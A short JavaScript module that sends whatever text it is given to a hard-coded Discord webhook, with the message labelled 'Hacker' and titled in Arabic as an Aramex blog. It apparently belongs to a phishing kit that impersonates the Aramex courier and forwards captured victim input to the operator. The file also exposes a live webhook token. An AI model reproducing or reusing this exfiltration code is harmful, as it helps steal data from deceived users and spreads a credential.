import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1326138682687750298/iBlls8hKiLLvU6UCh9wfLqliMwIS3xX4dFtHStkxYVg_Z7-q90Qua6TbkGwte6IktOlh",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
